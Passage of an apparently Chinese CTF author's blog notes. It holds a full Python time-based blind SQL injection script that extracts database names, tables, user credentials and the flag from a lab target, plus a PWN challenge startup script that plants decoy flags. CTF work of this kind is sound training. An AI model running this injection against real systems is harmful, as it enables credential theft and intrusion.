+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7390941e-b2b7-485b-9c3c-caa29a3f2c6b.node.oj.huts.ec/man/register&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">payload_length = &#123;</span><br><span class="line">    <span class="string">&quot;database&quot;</span>: <span class="string">&quot;0&#x27; or (case when (length((select database()))=%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;user&quot;</span>: <span class="string">&quot;0&#x27; or (case when (length((select user()))=%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;version&quot;</span>: <span class="string">&quot;0&#x27; or (case when (length((select version()))=%d) then sleep(1.8) else 1 end)) #&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">payload_data = &#123;</span><br><span class="line">    <span class="string">&quot;database&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select database()),%d,1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;user&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select user()),%d,1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;version&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select version()),%d,1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;schemata0&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(schema_name) from information_schema.schemata limit 0,&quot;</span></span><br><span class="line">                 <span class="string">&quot;1),%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;schemata1&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(schema_name) from information_schema.schemata limit 1,&quot;</span></span><br><span class="line">                 <span class="string">&quot;1),%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;schemata2&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(schema_name) from information_schema.schemata limit 2,&quot;</span></span><br><span class="line">                 <span class="string">&quot;1),%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;schemata3&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(schema_name) from information_schema.schemata limit 3,&quot;</span></span><br><span class="line">                 <span class="string">&quot;1),%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;schemata4&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(schema_name) from information_schema.schemata limit 4,&quot;</span></span><br><span class="line">                 <span class="string">&quot;1),%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;schemata5&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(schema_name) from information_schema.schemata limit 5,&quot;</span></span><br><span class="line">                 <span class="string">&quot;1),%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;tables0&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(table_name) from information_schema.tables where &quot;</span></span><br><span class="line">               <span class="string">&quot;table_schema=database() limit 0, 1),%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;tables1&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(table_name) from information_schema.tables where &quot;</span></span><br><span class="line">               <span class="string">&quot;table_schema=database() limit 1, 1),%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;columns0_users&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(column_name) from information_schema.columns &quot;</span></span><br><span class="line">                      <span class="string">&quot;where table_name=&#x27;users&#x27; limit 0, 1),%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;columns1_users&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(column_name) from information_schema.columns &quot;</span></span><br><span class="line">                      <span class="string">&quot;where table_name=&#x27;users&#x27; limit 1, 1),%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;columns0_flags&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(column_name) from information_schema.columns &quot;</span></span><br><span class="line">                      <span class="string">&quot;where table_name=&#x27;usfffffffffffffffffffflllllllllllaaaaaaaaaaaaaaggggggggggggg&#x27; limit 0, 1),&quot;</span></span><br><span class="line">                      <span class="string">&quot;%d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;users_username_password_0&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat_ws(&#x27;:&#x27;,username,password) from (&quot;</span></span><br><span class="line">                                 <span class="string">&quot;select * from users)a limit 0, 1), %d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;users_username_password_1&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat_ws(&#x27;:&#x27;,username,password) from (&quot;</span></span><br><span class="line">                                 <span class="string">&quot;select * from users)a limit 1, 1), %d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;users_username_password_2&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat_ws(&#x27;:&#x27;,username,password) from (&quot;</span></span><br><span class="line">                                 <span class="string">&quot;select * from users)a limit 2, 1), %d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;users_username_password_3&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat_ws(&#x27;:&#x27;,username,password) from (&quot;</span></span><br><span class="line">                                 <span class="string">&quot;select * from users)a limit 3, 1), %d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;users_username_password_4&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat_ws(&#x27;:&#x27;,username,password) from (&quot;</span></span><br><span class="line">                                 <span class="string">&quot;select * from users)a limit 4, 1), %d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;users_username_password_5&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat_ws(&#x27;:&#x27;,username,password) from (&quot;</span></span><br><span class="line">                                 <span class="string">&quot;select * from users)a limit 5, 1), %d, 1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;flags_flag&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select flag from &quot;</span></span><br><span class="line">                  <span class="string">&quot;`usfffffffffffffffffffflllllllllllaaaaaaaaaaaaaaggggggggggggg` limit 0, 1), %d, 1))&lt;%d) then &quot;</span></span><br><span class="line">                  <span class="string">&quot;sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_random_username</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_length</span>(<span class="params">wh</span>):</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">30</span>):</span><br><span class="line">        time1 = datetime.datetime.now()</span><br><span class="line">        data[<span class="string">&#x27;username&#x27;</span>] = get_random_username()</span><br><span class="line">        data[<span class="string">&#x27;password&#x27;</span>] = payload_length[wh] % i</span><br><span class="line">        conn = requests.post(url, data=data)</span><br><span class="line">        time2 = datetime.datetime.now()</span><br><span class="line">        sec = (time2 - time1).seconds</span><br><span class="line">        <span class="keyword">if</span> sec &gt;= <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;fuck &quot;</span> + wh + <span class="string">&quot; length &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot; failed&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;length for &quot;</span> + wh + <span class="string">&quot;: &quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>(<span class="params">wh</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">150</span>):</span><br><span class="line">        new = get_char(j, wh)</span><br><span class="line">        <span class="keyword">if</span> new <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        name += new</span><br><span class="line">        <span class="built_in">print</span>(name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;data for &quot;</span> + wh + <span class="string">&quot;: &quot;</span> + name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_char</span>(<span class="params">index, wh</span>):</span></span><br><span class="line">    minx = <span class="number">32</span></span><br><span class="line">    maxx = <span class="number">127</span></span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> minx &lt; maxx:</span><br><span class="line">        i = (minx + maxx) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> a == i:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">chr</span>(i)</span><br><span class="line">        data[<span class="string">&quot;username&quot;</span>] = get_random_username()</span><br><span class="line">        data[<span class="string">&quot;password&quot;</span>] = payload_data[wh] % (index, i)</span><br><span class="line">        t1 = datetime.datetime.now()</span><br><span class="line">        conn = requests.post(url, data=data)</span><br><span class="line">        t2 = datetime.datetime.now()</span><br><span class="line">        sec = (t2 - t1).seconds</span><br><span class="line">        <span class="keyword">if</span> sec &lt; <span class="number">1</span>:</span><br><span class="line">            minx = i</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            maxx = i</span><br><span class="line">        a = i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 响应超时导致返回不对很正常，多搞几次吧，大概插入 800+ 行就会恶疾频发，重启靶机吧</span></span><br><span class="line">    <span class="comment"># get_length(&quot;database&quot;)</span></span><br><span class="line">    <span class="comment"># database: 17</span></span><br><span class="line">    <span class="comment"># user: 15</span></span><br><span class="line">    <span class="comment"># version: 6</span></span><br><span class="line">    get_data(<span class="string">&quot;flags_flag&quot;</span>)</span><br><span class="line">    <span class="comment"># database: fiveonefivemanage</span></span><br><span class="line">    <span class="comment"># user: admin@localhost</span></span><br><span class="line">    <span class="comment"># version: 5.7.26</span></span><br><span class="line">    <span class="comment"># schemata0: information_schema</span></span><br><span class="line">    <span class="comment"># schemata1: fiveonefivemanage</span></span><br><span class="line">    <span class="comment"># schemata2：mysql</span></span><br><span class="line">    <span class="comment"># schemata3：performance_schema</span></span><br><span class="line">    <span class="comment"># schemata4：sys</span></span><br><span class="line">    <span class="comment"># tables0: users</span></span><br><span class="line">    <span class="comment"># tables1: usfffffffffffffffffffflllllllllllaaaaaaaaaaaaaaggggggggggggg</span></span><br><span class="line">    <span class="comment"># columns0_users: username</span></span><br><span class="line">    <span class="comment"># columns1_users: password</span></span><br><span class="line">    <span class="comment"># columns0_flags：flag</span></span><br><span class="line">    <span class="comment"># users_username_password_0:</span></span><br><span class="line">    <span class="comment"># users_username_password_1:</span></span><br><span class="line">    <span class="comment"># users_username_password_2:</span></span><br><span class="line">    <span class="comment"># users_username_password_3:</span></span><br><span class="line">    <span class="comment"># users_username_password_4:</span></span><br><span class="line">    <span class="comment"># users_username_password_5:</span></span><br><span class="line">    <span class="comment"># flags_flag:</span></span><br></pre></td></tr></table></figure>
+
+<p>谭总：“你搁这养蛊呢，自己日自己的项目。”，怎么说呢，还是很有意思，彳亍，（各位师傅别打我，我就一人畜无害的出题人，溜了溜了）</p>
+<h2 id="PWN-有手就行的-ez-nc"><a href="#PWN-有手就行的-ez-nc" class="headerlink" title="PWN-有手就行的 ez_nc"></a>PWN-有手就行的 ez_nc</h2><p>这题签到，怎么说呢，应该不会有人找不到 flag 吧🤭（嘻嘻.jpg）</p>
+<p><code>cat /bin/tac</code> 即可获得 flag（提示也说明了，cat 反过来，不就是 tac 嘛</p>
+<p>贴一下 start.sh 吧，我的得意之作</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># Add your startup script</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DO NOT DELETE</span></span><br><span class="line"></span><br><span class="line">mkdir -p /home/ctf/tmp</span><br><span class="line">mkdir -p /home/ctf/mnt</span><br><span class="line"><span class="built_in">echo</span> `date +%s | sha256sum | base64 | head -c 32 ; <span class="built_in">echo</span>` &gt; /home/ctf/tmp/1.txt</span><br><span class="line">sleep 1</span><br><span class="line"><span class="built_in">echo</span> `date +%s | sha256sum | base64 | head -c 32 ; <span class="built_in">echo</span>` &gt; /home/ctf/tmp/2.txt</span><br><span class="line">sleep 1</span><br><span class="line"><span class="built_in">echo</span> `date +%s | sha256sum | base64 | head -c 32 ; <span class="built_in">echo</span>` &gt; /home/ctf/tmp/3.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/mnt/c/`cat /home/ctf/tmp/1.txt`/d/`cat /home/ctf/tmp/2.txt`/e/`cat /home/ctf/tmp/3.txt`/&quot;</span> &gt; /home/ctf/tmp/1.exe</span><br><span class="line">mkdir -p /home/ctf`cat /home/ctf/tmp/1.exe`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;gong xi ni!!!!!!bu there is no flag!!!xpctf&#123;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx&#125;&quot;</span> &gt; /home/ctf`cat /home/ctf/tmp/1.exe`/flag</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xpctf&#123;12345678-90ab-cdef-ghij-klmnopqrstuv&#125;&quot;</span> &gt; /home/ctf/flag</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;but this is a fake flag&quot;</span> &gt;&gt; /home/ctf/flag</span><br><span class="line"></span><br><span class="line">rm -rf /home/ctf/tmp/*</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 1000`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">        mkdir -p /home/ctf/tmp/<span class="variable">$i</span>/</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;xpctf&#123;12345678-90ab-cdef-ghij-klmnopqrstuv&#125;&quot;</span> &gt; /home/ctf/tmp/<span class="variable">$i</span>/flag</span><br><span class="line">        mkdir -p /home/ctf/etc/<span class="variable">$i</span>/</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;xpctf&#123;12345678-90ab-cdef-ghij-klmnopqrstuv&#125;&quot;</span> &gt; /home/ctf/etc/<span class="variable">$i</span>/flag.txt</span><br><span class="line">        mkdir -p /home/ctf/mnt/<span class="variable">$i</span>/</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;xpctf&#123;12345678-90ab-cdef-ghij-klmnopqrstuv&#125;&quot;</span> &gt; /home/ctf/mnt/<span class="variable">$i</span>/flag.exe</span><br><span class="line">        mkdir -p /home/ctf/mnt/c/<span class="variable">$i</span>/</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;xpctf&#123;12345678-90ab-cdef-ghij-klmnopqrstuv&#125;&quot;</span> &gt; /home/ctf/mnt/c/<span class="variable">$i</span>/flag.list</span><br><span class="line">        mkdir -p /home/ctf/mnt/c/d/e/f/h/i/<span class="variable">$i</span>/</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;xpctf&#123;12345678-90ab-cdef-ghij-klmnopqrstuv&#125;&quot;</span> &gt; /home/ctf/mnt/c/d/e/f/h/i/flag.source</span><br><span class="line">        mkdir -p /home/ctf/mnt/`<span class="built_in">echo</span> <span class="string">&#x27;c&#x27;</span>+<span class="variable">$i</span>`/</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;xpctf&#123;12345678-90ab-cdef-ghij-klmnopqrstuv&#125;&quot;</span> &gt; /home/ctf/mnt/`<span class="built_in">echo</span> <span class="string">&#x27;c&#x27;</span>+<span class="variable">$i</span>`/flag.dui</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$FLAG</span> &gt; /home/ctf/bin/tac</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;I am so soooooooooooooooooooooooooooooooorry to zhe mo you so jiu~~~~~flag give you~o&quot;</span> &gt;&gt; /home/ctf/bin/tac</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xpctf&#123;flag_Du1L0v3lOVeYou&#125;&quot;</span> &gt; /home/ctf/etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hint: sha bi cai hui xin you hint, qian dao ti ye xiang yao hint? guai guai zhao bei, xi xi xi, but my cat is a little tiao pi, he like reverse&quot;</span> &gt; /home/ctf/hint.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># start ctf-xinetd</span></span><br><span class="line">/etc/init.d/xinetd start;</span><br><span class="line"><span class="built_in">trap</span> : TERM INT;</span><br><span class="line">sleep infinity &amp; <span class="built_in">wait</span>\</span><br></pre></td></tr></table></figure>
+
+<p>真的溜了 (0√0)</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/duitutu">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-%E4%BD%A0%E5%9C%A8%E6%89%AB%E5%B0%BC%E7%8E%9B%E7%9A%84%E4%B8%9C%E6%96%B9%E6%98%8E%E7%8F%A0%E5%A1%94%E6%89%AB%E5%91%A2%E4%BD%A0"><span class="toc-number">1.</span> <span class="toc-text">Web-你在扫尼玛的东方明珠塔扫呢你</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8C%E5%9C%A3"><span class="toc-number">2.</span> <span class="toc-text">Web-重生之我是赌圣</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-%F0%9F%91%B4%E5%A6%82%E4%BD%95%E8%8A%B1%E5%BF%92%E5%A5%B6%E5%A5%B6%E7%9A%84%E4%B8%80%E5%A4%A9%E9%80%83%E7%A6%BB%E7%9B%91%E7%8B%B1"><span class="toc-number">3.</span> <span class="toc-text">Web-👴如何花忒奶奶的一天逃离监狱</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN-%E6%9C%89%E6%89%8B%E5%B0%B1%E8%A1%8C%E7%9A%84-ez-nc"><span class="toc-number">4.</span> <span class="toc-text">PWN-有手就行的 ez_nc</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/10/16/XPCTF-HUT-%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/10/16/XPCTF-HUT-%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/&text=XPCTF@HUT 出题笔记"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/10/16/XPCTF-HUT-%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/&title=XPCTF@HUT 出题笔记"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/10/16/XPCTF-HUT-%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/&is_video=false&description=XPCTF@HUT 出题笔记"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XPCTF@HUT 出题笔记&body=Check out this article: http://example.com/2021/10/16/XPCTF-HUT-%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/10/16/XPCTF-HUT-%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/&title=XPCTF@HUT 出题笔记"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/10/16/XPCTF-HUT-%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/&title=XPCTF@HUT 出题笔记"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/10/16/XPCTF-HUT-%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/&title=XPCTF@HUT 出题笔记"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/10/16/XPCTF-HUT-%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/&title=XPCTF@HUT 出题笔记"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/10/16/XPCTF-HUT-%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/&name=XPCTF@HUT 出题笔记&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/10/16/XPCTF-HUT-%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/&t=XPCTF@HUT 出题笔记"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021
+    Du1L0v3
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/duitutu">Projects</a></li>
+        
+         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+         <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+      </ul>
